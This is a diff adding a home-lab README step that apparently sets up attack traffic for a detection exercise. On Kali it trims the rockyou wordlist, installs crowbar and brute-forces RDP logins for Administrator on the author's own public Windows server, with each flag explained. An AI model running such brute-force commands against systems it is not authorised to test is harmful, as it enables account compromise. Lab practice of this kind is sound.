@@ -488,8 +488,71 @@ systemctl restart docker
 
   ![mythic](https://github.com/user-attachments/assets/143680b0-5ee5-4f81-bca3-6bc25468ea84)
 
-   
+
+
+**Day 21 Mythic Agent Setup**
+
+* Created a text file named passwords in the Documents folder on my Windows Sever.
+* In the test file I entered a password: **F@all2024!**
+* Opened the Kali Linux VM and navigated to the directory **/usr/share/wordlists**
+* Unzipped the rockyou password list using the following command
+
+  ```bash
+  sudo gunzip rockyou.txt.gz
+  ```
+
+* Due to the large size of the password list, I opted to extract the first 50 entries
+
+  ```bash
+  head -50 rockyou.txt > /home/user/user-wordlist.txt
+  ```
   
+* Saved these entries to a new file named: **mydfir-wordlists-cag.txt**
+
+* I added the password F@all2024$ to the text file with nano and saved it
+
+```bash
+cat mydfir-wordlists-cag.txt
+```
+![WhatsApp Image 2024-11-12 at 12 39 16_49a2cbf4](https://github.com/user-attachments/assets/765dcfae-0e88-4d6c-a070-7a6e221d7b94)
+
+
+
+* install crowbar:
+
+```bash
+sudo apt-get install -y crowbar
+```
+
+* Create a new file with nano called target.txt
+* Enter the public IP address of the Windows server: 45.77.155.26 & the user name: Administrator
+
+
+**To Perform a Brute Force Attack run the following command**
+
+```bash
+crowbar -b rdp -u Administrator -C /home/user/mydfir-wordlists-cag.txt -s 45.77.155.26/32
+```
+
+* crowbar: Specifies the use of the Crowbar tool for the attack.
+* -b rdp: Targets the Remote Desktop Protocol (RDP).
+* -u Administrator: Specifies the Administrator user account for the login attempts.
+* -C /home/user/mydfir-wordlists-cag.txt: Points to the wordlist file containing the passwords for authentication attempts.
+* -s 45.77.155.26/32: Defines the target IP address, with /32 notation specifying only that single address.
+
+  ![WhatsApp Image 2024-11-12 at 12 39 15_3531cf45](https://github.com/user-attachments/assets/b2834412-cf67-421d-b817-872a29bf795c)
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
